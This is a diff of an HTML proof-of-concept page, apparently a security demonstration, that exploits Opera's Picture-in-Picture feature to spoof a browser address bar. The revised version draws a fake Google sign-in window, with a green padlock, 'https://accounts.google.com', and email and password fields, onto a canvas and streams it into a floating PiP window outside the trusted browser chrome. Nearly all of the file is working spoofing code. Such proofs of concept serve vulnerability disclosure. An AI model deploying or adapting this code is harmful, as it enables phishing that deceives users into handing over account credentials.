@@ -1,56 +1,100 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Opera PiP Address Bar Spoof PoC</title>
+  <title>Opera PiP Spoof Demo</title>
   <style>
-    video {
-      width: 600px;
-      border: 2px solid black;
+    body { font-family: Arial, sans-serif; }
+    #fake-window {
+      width: 400px;
+      height: 300px;
+      border: 1px solid #ccc;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
     }
-    #fakebar {
-      font-family: Arial, sans-serif;
+    #fake-addressbar {
       background: #f1f3f4;
-      padding: 8px;
+      padding: 5px 10px;
+      font-size: 14px;
+      color: green;
       border-bottom: 1px solid #ccc;
     }
-    #padlock {
-      color: green;
-      font-weight: bold;
+    #login-form {
+      padding: 20px;
+    }
+    input {
+      display: block;
+      width: 90%;
+      padding: 8px;
+      margin: 10px auto;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    button {
+      padding: 8px 12px;
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
   <h2>Opera PiP Spoof Demo</h2>
-  <button id="exploit">Launch Fake Google</button>
-  
-  <video id="vid" autoplay loop muted playsinline>
-    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-  </video>
+  <button onclick="launchFake()">Launch Fake Google Login</button>
+
+  <video id="pip-video" controls style="display:none;"></video>
+
+  <template id="spoof-template">
+    <div id="fake-window">
+      <div id="fake-addressbar">🔒 https://accounts.google.com</div>
+      <div id="login-form">
+        <h3>Sign in</h3>
+        <input type="email" placeholder="Email or phone">
+        <input type="password" placeholder="Enter your password">
+        <button>Next</button>
+      </div>
+    </div>
+  </template>
 
   <script>
-    const btn = document.getElementById('exploit');
-    const vid = document.getElementById('vid');
+    async function launchFake() {
+      let video = document.getElementById('pip-video');
+      let canvas = document.createElement('canvas');
+      canvas.width = 400;
+      canvas.height = 300;
+      let ctx = canvas.getContext('2d');
 
-    btn.onclick = async () => {
-      // Generate spoofed UI as video overlay
-      const canvas = document.createElement("canvas");
-      canvas.width = 800; canvas.height = 80;
-      const ctx = canvas.getContext("2d");
-      
-      ctx.fillStyle = "#f1f3f4";
-      ctx.fillRect(0,0,800,80);
-      ctx.fillStyle = "green";
-      ctx.fillText("🔒 https://accounts.google.com", 20, 50);
-      
-      const fakeBar = canvas.captureStream();
-      vid.srcObject = fakeBar; // replace vid feed
-      
-      // Enter PiP (floating window with no trusted UI)
+      // Render HTML into canvas (simplified spoof)
+      let spoof = document.getElementById('spoof-template').content.cloneNode(true);
+      document.body.appendChild(spoof);
+
+      // Trick: Stream canvas into PiP
+      let stream = canvas.captureStream();
+      video.srcObject = stream;
+
+      // Animate fake PiP
+      setInterval(() => {
+        ctx.fillStyle = "#fff";
+        ctx.fillRect(0,0,400,300);
+        ctx.fillStyle = "green";
+        ctx.font = "14px Arial";
+        ctx.fillText("🔒 https://accounts.google.com", 10, 20);
+        ctx.fillStyle = "black";
+        ctx.fillText("Sign in", 160, 60);
+        ctx.fillText("Email or phone:", 20, 100);
+        ctx.fillText("Password:", 20, 150);
+        ctx.fillStyle = "#1a73e8";
+        ctx.fillRect(150, 200, 100, 30);
+        ctx.fillStyle = "#fff";
+        ctx.fillText("Next", 180, 220);
+      }, 500);
+
       try {
-        await vid.requestPictureInPicture();
-        alert("Fake Google address bar now floating! 🚨");
-      } catch(e) {
-        console.error(e);
+        await video.requestPictureInPicture();
+      } catch (err) {
+        alert("PiP not supported: " + err);
       }
     }
   </script>
